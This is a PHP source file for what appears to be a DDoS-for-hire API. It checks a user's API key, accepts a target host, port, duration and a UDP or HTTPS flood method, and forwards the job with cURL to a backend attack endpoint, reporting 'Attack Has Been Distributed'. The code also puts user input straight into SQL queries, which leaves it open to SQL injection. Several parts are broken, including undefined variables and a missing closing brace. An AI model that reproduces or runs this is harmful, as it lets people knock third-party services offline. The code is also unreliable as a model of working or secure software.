<?php
  // Start up MySQL.
  include('config/conn.php');
  session_start();

  // Set up the Title.
  echo "<title>API</title>";
  echo "<body style='background-color:black'>";
  // Function to sanatize all parameters.
  function htmlsc($string) {
    return htmlspecialchars($string, ENT_QUOTES, "UTF-8");
  }

  // Variable to store all keys.
  $keyList = array("");

  // Parameter variables.
  $host = htmlsc($_GET['host']);
  $port = htmlsc($_GET['port']);
  $time = htmlsc($_GET['time']);
  $type = htmlsc($_GET['type']);
  $key = htmlsc($_GET['key']);

  // Error handler.
  if (!isset($_GET["key"]) || !isset($_GET["host"]) || !isset($_GET["port"]) || !isset($_GET["type"]) || !isset($_GET["time"])) {
    $errParameter = fopen("error/parameters.json", "r");
    $read = fread($errParameter, filesize("error/parameters.json"));
    fclose($errParameter);
    die($read);
  }

  $sql = "SELECT * FROM users WHERE apikey ='$key';";
  $result = mysqli_query($conn, $sql);
  if (mysqli_num_rows($result) === 1) {
    $row = mysqli_fetch_assoc($result);
    if ($row['key'] == $key && $row['banned'] == "false") {
      session_start();
      $_SESSION["loggedin"] = true;
      $_SESSION["id"] = $id;
      $_SESSION["key"] = $userKey;
    }

    else if ($row['key'] == $key && $row['banned'] == "true") {
      $errBanned = fopen("error/banned.json", "r");
      $read = fread($errBanned, filesize("error/banned.json"));
      fclose($errBanned);
      die(read);
    }
  }

  else {
    $errInvalid = fopen("error/invalid.json", "r");
    $read = fread($errInvalid, filesize("error/invalid.json"));
    fclose($errInvalid);
    die($read);
  }

  $sql = "SELECT * FROM users WHERE duration_limit =$time;";
  $result = mysqli_query($conn, $sql);
  if (mysqli_num_rows($result) === 1) {
    $row = mysqli_fetch_assoc($result);
    if ($time < $row['duration']) {
      $errTime = fopen("error/time.json", "r");
     $read = fread($errTime, filesize("error/time.json"));
      fclose($errTime);
      die($read);
    }
  }



  // API Keys 
  $exampleKey = "lol";

  // Here is the part where the methods are actually created.

//L4 methods

  if ($type == "API-UDP" || $type == "api-udp") {
    $layer7 = "false";
    $exampleMethod = "UDP";
    $exampleMethod = "UDP";
  }
 

  else if ($type == "API-HTTPS" || $type == "api-https") {
    $layer7 = "true";
    $exampleMethod = "HTTPS";
    $exampleMethod = "HTTPS";
  }


  else {
      $err404 = fopen("error/404.json", "r");
      $read = fread($err404, filesize("error/404.json"));
      fclose($err404);
      die($read);
  }
  // Here is the part where the links actually get set so the code could cURL them.
  if ($layer7 == "false") {
     $exampleApi = "http://api.here/API.php?&host=$host&port=$port&time=$time&type=$exampleMethod&key=$exampleKey";

     $exampleSend = curl_init();
     curl_setopt($exampleSend, CURLOPT_URL, $example);
     curl_setopt($exampleSend, CURLOPT_RETURNTRANSFER, true);
     $ctxHead = curl_exec($exampleSend);
     curl_close($exampleSend);
     if(!$exampleHead) {
       $errFailed = fopen("error/failed.json", "r");
       $read = fread($errFailed, filesize("error/failed.json"));
       fclose($errFailed);
       die($read);
       return FALSE;
     }

  }

  if ($layer7 == "true") {
    $exampleApi = "http://api.here/API.php?&host=$host&port=$port&time=$time&type=$exampleMethod&key=$exampleKey";

 $exampleSend = curl_init();
 curl_setopt($exampleSend, CURLOPT_URL, $example);
 curl_setopt($exampleSend, CURLOPT_RETURNTRANSFER, true);
 $ctxHead = curl_exec($exampleSend);
 curl_close($exampleSend);
 if(!$exampleHead) {
   $errFailed = fopen("error/failed.json", "r");
   $read = fread($errFailed, filesize("error/failed.json"));
   fclose($errFailed);
   die($read);
   return FALSE;
 }

  die("<marquee><font color=#a5ecfe>{ \"Success!\": Attack Has Been Distributed, \"Attack info\": { \"target\": \"$host\", \"port\": \"$port\", \"time\": \"$time\", \"method\": \"$type\" }</marquee>");

  // Kill the user session after the attack was done.
  session_unset();
  session_destroy(); 
  
